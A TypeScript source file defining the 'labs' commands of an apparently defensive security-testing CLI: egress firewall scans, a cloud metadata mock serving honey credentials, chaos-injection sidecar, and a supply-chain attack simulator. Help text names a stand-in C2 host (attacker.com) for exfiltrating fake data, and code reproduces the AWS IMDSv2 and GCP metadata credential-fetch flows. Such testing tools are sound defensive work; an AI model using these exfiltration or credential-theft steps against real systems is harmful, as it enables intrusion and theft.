/**
 * Labs Commands
 * Experimental features: AI, Escape Artist, Imposter, Sidecar, Simulator
 */

import type { Command } from 'commander';
import type { ApparatusClient } from '@apparatus/client';
import chalk from 'chalk';
import * as output from '../output.js';

// ============================================================================
// Response Type Interfaces
// ============================================================================

/** AI chat response from /api/ai/chat */
interface AiChatResponse {
  response: string;
  sessionId?: string;
}

/** Escape Artist scan result from /api/escape/scan */
interface EscapeScanResponse {
  timestamp: string;
  payload_type: string;
  checks: EgressCheck[];
}

interface EgressCheck {
  method: string;
  status: 'success' | 'failed' | 'error';
  details?: string;
  latencyMs?: number;
}

/** Cloud Imposter AWS credentials response */
interface AwsCredentialsResponse {
  Code: string;
  LastUpdated: string;
  Type: string;
  AccessKeyId: string;
  SecretAccessKey: string;
  Token: string;
  Expiration: string;
}

/** Cloud Imposter GCP token response */
interface GcpTokenResponse {
  access_token: string;
  expires_in: number;
  token_type: string;
}

/** Supply chain simulation response */
interface SupplyChainResponse {
  logs: string[];
}

// ============================================================================
// Command Registration
// ============================================================================

export function registerLabsCommands(program: Command, getClient: () => ApparatusClient): void {
  const labs = program
    .command('labs')
    .description('Experimental features: AI, Escape, Imposter, Sidecar, Simulator');

  // AI Chat
  labs
    .command('ai-chat <message>')
    .description('Chat with the AI')
    .option('-s, --system <prompt>', 'System prompt', 'You are a helpful assistant.')
    .action(async (message, options) => {
      const client = getClient();
      const spin = output.spinner('Thinking...');
      spin.start();

      try {
        const res = await fetch(`${client.getBaseUrl()}/api/ai/chat`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message,
            system: options.system,
            sessionId: 'cli-' + Date.now()
          })
        });

        if (!res.ok) throw new Error(`Status ${res.status}`);
        const data = await res.json() as AiChatResponse;

        spin.stop();
        output.header('AI Response');
        console.log(data.response);
      } catch (err) {
        spin.stop();
        output.error(`AI failed: ${(err as Error).message}`);
        process.exit(1);
      }
    });

  // Escape Artist - Egress Firewall Validation
  labs
    .command('escape-scan')
    .description('Run egress firewall scan (Egress Tester)')
    .option('-t, --target <url>', 'C2 server or target URL for exfil test')
    .option('-d, --data <string>', 'Data to exfiltrate')
    .option('--dlp <type>', 'Generate fake sensitive data: cc, ssn, email')
    .option('--ports <ports>', 'Ports to test (comma sep)', '80,443,8080,22,21,53')
    .option('--report', 'Report breaches to Risk Server (Threat Intel)')
    .addHelpText('after', `
Examples:
  $ apparatus labs escape-scan                           # Basic scan
  $ apparatus labs escape-scan --dlp cc                  # Exfil fake credit card
  $ apparatus labs escape-scan -t https://attacker.com   # Test against C2
  $ apparatus labs escape-scan --report                  # Report to Threat Intel`)
    .action(async (options) => {
      const client = getClient();
      const spin = output.spinner('Running Escape Artist scan (this may take a while)...');
      spin.start();

      try {
        const ports = options.ports.split(',').map((p: string) => parseInt(p.trim()));
        const payload: Record<string, unknown> = {
          target: options.target,
          data: options.data,
          dlpType: options.dlp,
          ports,
          report: options.report || false,
        };

        const res = await fetch(`${client.getBaseUrl()}/api/escape/scan`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (!res.ok) throw new Error(`Status ${res.status}`);
        const data = await res.json() as EscapeScanResponse;

        spin.stop();
        output.header('Escape Artist Scan Results');
        output.labelValue('Timestamp', data.timestamp);
        output.labelValue('Payload Type', data.payload_type);

        output.subheader('\nEgress Checks:');
        for (const check of data.checks) {
          const icon = check.status === 'success' ? chalk.red('⚠ OPEN') : chalk.green('✓ BLOCKED');
          console.log(`  ${icon} ${check.method}${check.details ? ` - ${check.details}` : ''}`);
        }

        const breaches = data.checks.filter(c => c.status === 'success').length;
        if (breaches > 0) {
          output.warning(`\n${breaches} egress path(s) detected!`);
          if (options.report) {
            output.info('Breach report sent to Risk Server');
          }
        } else {
          output.success('\nNo egress breaches detected');
        }
      } catch (err) {
        spin.stop();
        output.error(`Scan failed: ${(err as Error).message}`);
        process.exit(1);
      }
    });

  // Cloud Imposter Status
  labs
    .command('imposter-status')
    .description('Check Cloud Imposter status (Cloud Metadata Mock)')
    .option('--port <port>', 'Imposter port', '16925')
    .action(async (options) => {
      const url = `http://localhost:${options.port}/health`;
      const spin = output.spinner(`Checking Imposter at ${url}...`);
      spin.start();

      try {
        const res = await fetch(url);
        if (res.ok) {
          const data = await res.json() as Record<string, unknown>;
          spin.stop();
          output.success('Cloud Imposter is ONLINE');
          output.printKeyValue(data);
        } else {
          throw new Error(`Status ${res.status}`);
        }
      } catch (err) {
        spin.stop();
        output.error(`Cloud Imposter is OFFLINE: ${(err as Error).message}`);
        output.info('Start with: npm run imposter (in apparatus directory)');
        process.exit(1);
      }
    });

  // Toxic Sidecar Status
  labs
    .command('sidecar-status')
    .description('Check Toxic Sidecar status')
    .option('-p, --port <port>', 'Sidecar port', '8081')
    .action(async (options) => {
      const url = `http://localhost:${options.port}/healthz`;
      const spin = output.spinner(`Checking Sidecar proxy at ${url}...`);
      spin.start();

      try {
        const res = await fetch(url);
        if (res.ok) {
          spin.stop();
          output.success('Toxic Sidecar is ONLINE (Proxying correctly)');
        } else {
          throw new Error(`Status ${res.status}`);
        }
      } catch (err) {
        spin.stop();
        output.error(`Toxic Sidecar is OFFLINE: ${(err as Error).message}`);
        output.info('Start with: npm run sidecar (in apparatus directory)');
        process.exit(1);
      }
    });

  // Toxic Sidecar Inject - Send request through sidecar with toxic mode
  labs
    .command('sidecar-inject')
    .description('Send request through Toxic Sidecar with chaos injection')
    .argument('<path>', 'Request path (e.g., /api/test)')
    .option('-m, --mode <mode>', 'Toxic mode: latency, error_500, slow_drip, corrupt_body')
    .option('-p, --port <port>', 'Sidecar port', '8081')
    .option('--method <method>', 'HTTP method', 'GET')
    .addHelpText('after', `
Toxic Modes:
  latency      Add 500-2500ms delay
  error_500    Return 500 error immediately
  slow_drip    Stream response slowly (100ms/chunk)
  corrupt_body Bit-flip corruption (10% chance/chunk)

Examples:
  $ apparatus labs sidecar-inject /api/test                    # Random toxic (5% chance)
  $ apparatus labs sidecar-inject /api/test -m latency         # Force latency injection
  $ apparatus labs sidecar-inject /api/test -m slow_drip       # Slow drip response`)
    .action(async (path, options) => {
      const url = `http://localhost:${options.port}${path}`;
      const headers: Record<string, string> = {};
      if (options.mode) {
        headers['X-Toxic-Mode'] = options.mode;
      }

      const spin = output.spinner(`Sending ${options.method} to sidecar${options.mode ? ` (mode: ${options.mode})` : ''}...`);
      spin.start();
      const startTime = Date.now();

      try {
        const res = await fetch(url, {
          method: options.method,
          headers,
        });

        const elapsed = Date.now() - startTime;
        const body = await res.text();

        spin.stop();
        output.header('Sidecar Response');
        output.printKeyValue({
          Status: `${res.status} ${res.statusText}`,
          'Latency (ms)': elapsed,
          'Toxic Mode': options.mode || 'random (5% chance)',
        });

        if (body.length > 0) {
          output.subheader('\nBody:');
          try {
            output.printJson(JSON.parse(body));
          } catch {
            console.log(body.slice(0, 500) + (body.length > 500 ? '...' : ''));
          }
        }
      } catch (err) {
        spin.stop();
        output.error(`Sidecar request failed: ${(err as Error).message}`);
        process.exit(1);
      }
    });

  // Cloud Imposter Credentials - Show honey credentials
  labs
    .command('imposter-creds')
    .description('Fetch honey credentials from Cloud Imposter')
    .option('-p, --provider <provider>', 'Cloud provider: aws, gcp', 'aws')
    .option('--port <port>', 'Imposter port', '16925')
    .option('--role <role>', 'AWS IAM role name', 'imposter-role')
    .addHelpText('after', `
Examples:
  $ apparatus labs imposter-creds                  # Get AWS honey creds
  $ apparatus labs imposter-creds -p gcp           # Get GCP honey token
  $ apparatus labs imposter-creds --role admin     # Custom role name`)
    .action(async (options) => {
      const baseUrl = `http://localhost:${options.port}`;
      const spin = output.spinner(`Fetching ${options.provider.toUpperCase()} honey credentials...`);
      spin.start();

      try {
        if (options.provider === 'aws') {
          // AWS IMDSv2 flow
          const tokenRes = await fetch(`${baseUrl}/latest/api/token`, {
            method: 'PUT',
            headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' },
          });

          if (!tokenRes.ok) throw new Error(`Token fetch failed: ${tokenRes.status}`);
          const token = await tokenRes.text();

          const credsRes = await fetch(`${baseUrl}/latest/meta-data/iam/security-credentials/${options.role}`, {
            headers: { 'X-aws-ec2-metadata-token': token },
          });

          if (!credsRes.ok) throw new Error(`Creds fetch failed: ${credsRes.status}`);
          const creds = await credsRes.json() as AwsCredentialsResponse;

          spin.stop();
          output.header('AWS Honey Credentials (FAKE)');
          output.warning('These are honey credentials for detection - NOT real AWS keys!');
          output.printJson(creds);
        } else if (options.provider === 'gcp') {
          // GCP metadata flow
          const res = await fetch(`${baseUrl}/computeMetadata/v1/instance/service-accounts/default/token`, {
            headers: { 'Metadata-Flavor': 'Google' },
          });

          if (!res.ok) throw new Error(`Token fetch failed: ${res.status}`);
          const gcpToken = await res.json() as GcpTokenResponse;

          spin.stop();
          output.header('GCP Honey Token (FAKE)');
          output.warning('This is a honey token for detection - NOT a real GCP token!');
          output.printJson(gcpToken);
        } else {
          throw new Error(`Unknown provider: ${options.provider}`);
        }
      } catch (err) {
        spin.stop();
        output.error(`Failed to fetch credentials: ${(err as Error).message}`);
        output.info('Ensure Cloud Imposter is running: npm run imposter');
        process.exit(1);
      }
    });

  // Supply Chain Attack Simulator
  labs
    .command('supply-chain')
    .description('Simulate malicious npm package behavior')
    .option('-t, --target <url>', 'C2 server URL', 'http://attacker.com')
    .option('--force', 'Skip confirmation prompt')
    .addHelpText('after', `
This simulates what a malicious npm package might do:
  1. Harvest environment variables (secrets, API keys)
  2. Attempt cloud credential theft via IMDS
  3. Exfiltrate data to C2 server

Examples:
  $ apparatus labs supply-chain                              # Simulate attack
  $ apparatus labs supply-chain -t http://localhost:9999     # Custom C2`)
    .action(async (options) => {
      const client = getClient();

      if (!options.force) {
        output.warning('⚠️  SUPPLY CHAIN ATTACK SIMULATION');
        output.info('This will simulate malicious package behavior:');
        console.log('  • Scan environment for secrets');
        console.log('  • Attempt IMDS credential theft');
        console.log('  • Attempt data exfiltration\n');

        const readline = await import('readline');
        const rl = readline.createInterface({
          input: process.stdin,
          output: process.stdout,
        });

        const answer = await new Promise<string>((resolve) => {
          rl.question('Continue? [y/N] ', resolve);
        });
        rl.close();

        if (answer.toLowerCase() !== 'y') {
          output.info('Aborted');
          return;
        }
      }

      const spin = output.spinner('Simulating supply chain attack...');
      spin.start();

      try {
        const res = await fetch(`${client.getBaseUrl()}/api/simulator/supply-chain`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ target: options.target }),
        });

        if (!res.ok) throw new Error(`Status ${res.status}`);
        const data = await res.json() as SupplyChainResponse;

        spin.stop();
        output.header('Supply Chain Attack Simulation');

        for (const log of data.logs) {
          console.log(log);
        }
      } catch (err) {
        spin.stop();
        output.error(`Simulation failed: ${(err as Error).message}`);
        process.exit(1);
      }
    });

  // AI Personas - List available AI personas
  labs
    .command('ai-personas')
    .description('List available AI personas for chat')
    .action(() => {
      output.header('Available AI Personas');
      console.log(`
  ${chalk.cyan('linux_terminal')} (default with -s flag)
    Simulates a compromised Ubuntu server
    User: www-data on prod-web-01
    Directory: /var/www/html with fake config files

  ${chalk.cyan('helpful_assistant')} (default)
    Standard helpful AI assistant

Usage:
  $ apparatus labs ai-chat "ls -la" -s linux_terminal
  $ apparatus labs ai-chat "cat config.php" -s linux_terminal
`);
    });

  // ============================================================================
  // Infrastructure Commands
  // ============================================================================

  const infra = labs
    .command('infra')
    .description('Infrastructure probing and status checks');

  // Infrastructure status
  infra
    .command('status')
    .description('Display status of all infrastructure services')
    .option('--port <port>', 'Filter by port')
    .option('--protocol <protocol>', 'Filter by protocol: tcp|udp|ws')
    .action(async (options) => {
      const client = getClient();
      const spin = output.spinner('Fetching infrastructure status...');
      spin.start();

      try {
        const res = await fetch(`${client.getBaseUrl()}/api/infra/status`);
        if (!res.ok) throw new Error(`Status ${res.status}`);
        const data = await res.json() as { success: boolean; servers: Array<{ name: string; protocol: string; port: number; status: string; path?: string }> };

        spin.stop();
        output.header('Infrastructure Status');

        let servers = data.servers || [];
        if (options.port) {
          servers = servers.filter(s => s.port === parseInt(options.port));
        }
        if (options.protocol) {
          servers = servers.filter(s => s.protocol === options.protocol);
        }

        const rows = servers.map(s => {
          const statusIcon = s.status === 'active' ? '✓' : s.status === 'disabled' ? '-' : '✗';
          return [
            statusIcon,
            s.name,
            s.protocol.toUpperCase(),
            s.port.toString(),
            s.path || '-',
            s.status,
          ];
        });

        output.printTable(['', 'Service', 'Protocol', 'Port', 'Path', 'Status'], rows);
      } catch (err) {
        spin.stop();
        output.error(`Failed to fetch infrastructure status: ${(err as Error).message}`);
        process.exit(1);
      }
    });

  // Infrastructure imposter status
  infra
    .command('imposter')
    .description('Check Cloud Imposter infrastructure status')
    .action(async () => {
      const client = getClient();
      const spin = output.spinner('Checking Cloud Imposter status...');
      spin.start();

      try {
        const res = await fetch(`${client.getBaseUrl()}/api/infra/imposter`);
        spin.stop();

        if (res.ok) {
          const data = await res.json() as Record<string, unknown>;
          output.header('Cloud Imposter Status');
          output.success('✓ Cloud Imposter is ONLINE');
          output.subheader('\nDetails:');
          output.printJson(data);
        } else {
          output.error('✗ Cloud Imposter returned error');
          const data = await res.json();
          output.printJson(data);
          process.exit(1);
        }
      } catch (err) {
        spin.stop();
        output.error(`Cloud Imposter is OFFLINE: ${(err as Error).message}`);
        output.info('Start with: npm run imposter (in apparatus directory)');
        process.exit(1);
      }
    });

  // Infrastructure sidecar status
  infra
    .command('sidecar')
    .description('Check Toxic Sidecar infrastructure status')
    .action(async () => {
      const client = getClient();
      const spin = output.spinner('Checking Toxic Sidecar status...');
      spin.start();

      try {
        const res = await fetch(`${client.getBaseUrl()}/api/infra/sidecar`);
        spin.stop();

        if (res.ok) {
          const data = await res.json() as Record<string, unknown>;
          output.header('Toxic Sidecar Status');
          output.success('✓ Toxic Sidecar is ONLINE');
          output.printJson(data);
        } else {
          output.error('✗ Toxic Sidecar returned error');
          const data = await res.json();
          output.printJson(data);
          process.exit(1);
        }
      } catch (err) {
        spin.stop();
        output.error(`Toxic Sidecar is OFFLINE: ${(err as Error).message}`);
        output.info('Start with: npm run sidecar (in apparatus directory)');
        process.exit(1);
      }
    });

  // ============================================================================
  // Enhanced Imposter Commands (new organization)
  // ============================================================================

  const imposter = labs
    .command('imposter')
    .description('Cloud credential spoofing and theft simulation');

  // AWS credentials
  imposter
    .command('aws')
    .description('Fetch AWS honey credentials from Cloud Imposter')
    .option('--port <port>', 'Imposter port', '16925')
    .option('--role <role>', 'AWS IAM role name', 'imposter-role')
    .addHelpText('after', `
Examples:
  $ apparatus labs imposter aws                    # Get AWS honey creds
  $ apparatus labs imposter aws --role admin       # Custom role name`)
    .action(async (options) => {
      const baseUrl = `http://localhost:${options.port}`;
      const spin = output.spinner('Fetching AWS honey credentials...');
      spin.start();

      try {
        // AWS IMDSv2 flow
        const tokenRes = await fetch(`${baseUrl}/latest/api/token`, {
          method: 'PUT',
          headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' },
        });

        if (!tokenRes.ok) throw new Error(`Token fetch failed: ${tokenRes.status}`);
        const token = await tokenRes.text();

        const credsRes = await fetch(`${baseUrl}/latest/meta-data/iam/security-credentials/${options.role}`, {
          headers: { 'X-aws-ec2-metadata-token': token },
        });

        if (!credsRes.ok) throw new Error(`Creds fetch failed: ${credsRes.status}`);
        const creds = await credsRes.json() as AwsCredentialsResponse;

        spin.stop();
        output.header('AWS Honey Credentials (FAKE)');
        output.warning('These are honey credentials for detection - NOT real AWS keys!');
        output.printJson(creds);
      } catch (err) {
        spin.stop();
        output.error(`Failed to fetch AWS credentials: ${(err as Error).message}`);
        output.info('Ensure Cloud Imposter is running: npm run imposter');
        process.exit(1);
      }
    });

  // GCP credentials
  imposter
    .command('gcp')
    .description('Fetch GCP honey token from Cloud Imposter')
    .option('--port <port>', 'Imposter port', '16925')
    .addHelpText('after', `
Examples:
  $ apparatus labs imposter gcp                    # Get GCP honey token`)
    .action(async (options) => {
      const baseUrl = `http://localhost:${options.port}`;
      const spin = output.spinner('Fetching GCP honey token...');
      spin.start();

      try {
        // GCP metadata flow
        const res = await fetch(`${baseUrl}/computeMetadata/v1/instance/service-accounts/default/token`, {
          headers: { 'Metadata-Flavor': 'Google' },
        });

        if (!res.ok) throw new Error(`Token fetch failed: ${res.status}`);
        const gcpToken = await res.json() as GcpTokenResponse;

        spin.stop();
        output.header('GCP Honey Token (FAKE)');
        output.warning('This is a honey token for detection - NOT a real GCP token!');
        output.printJson(gcpToken);
      } catch (err) {
        spin.stop();
        output.error(`Failed to fetch GCP token: ${(err as Error).message}`);
        output.info('Ensure Cloud Imposter is running: npm run imposter');
        process.exit(1);
      }
    });

  // ============================================================================
  // Enhanced Escape Commands (new organization)
  // ============================================================================

  const escape = labs
    .command('escape')
    .description('Container escape and egress testing');

  // Escape scan
  escape
    .command('scan')
    .description('Run egress firewall scan (Egress Tester)')
    .option('-t, --target <url>', 'C2 server or target URL for exfil test')
    .option('-d, --data <string>', 'Data to exfiltrate')
    .option('--dlp <type>', 'Generate fake sensitive data: cc, ssn, email')
    .option('--payload <type>', 'Payload type to test')
    .option('--ports <ports>', 'Ports to test (comma sep)', '80,443,8080,22,21,53')
    .option('--report', 'Report breaches to Risk Server (Threat Intel)')
    .addHelpText('after', `
Examples:
  $ apparatus labs escape scan                     # Basic scan
  $ apparatus labs escape scan --dlp cc            # Exfil fake credit card
  $ apparatus labs escape scan -t https://attacker.com  # Test against C2
  $ apparatus labs escape scan --payload dns       # Test DNS exfiltration
  $ apparatus labs escape scan --report            # Report to Threat Intel`)
    .action(async (options) => {
      const client = getClient();
      const spin = output.spinner('Running escape analysis scan...');
      spin.start();

      try {
        const ports = options.ports.split(',').map((p: string) => parseInt(p.trim()));
        const payload: Record<string, unknown> = {
          target: options.target,
          data: options.data,
          dlpType: options.dlp,
          payloadType: options.payload,
          ports,
          report: options.report || false,
        };

        const res = await fetch(`${client.getBaseUrl()}/api/escape/scan`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (!res.ok) throw new Error(`Status ${res.status}`);
        const data = await res.json() as EscapeScanResponse;

        spin.stop();
        output.header('Escape Analysis Results');
        output.labelValue('Timestamp', data.timestamp);
        output.labelValue('Payload Type', data.payload_type);

        output.subheader('\nEgress Checks:');
        for (const check of data.checks) {
          const icon = check.status === 'success' ? chalk.red('⚠ OPEN') : chalk.green('✓ BLOCKED');
          console.log(`  ${icon} ${check.method}${check.details ? ` - ${check.details}` : ''}`);
        }

        const breaches = data.checks.filter(c => c.status === 'success').length;
        if (breaches > 0) {
          output.warning(`\n${breaches} egress path(s) detected!`);
          if (options.report) {
            output.info('Breach report sent to Risk Server');
          }
        } else {
          output.success('\nNo egress breaches detected');
        }
      } catch (err) {
        spin.stop();
        output.error(`Escape analysis failed: ${(err as Error).message}`);
        process.exit(1);
      }
    });
}
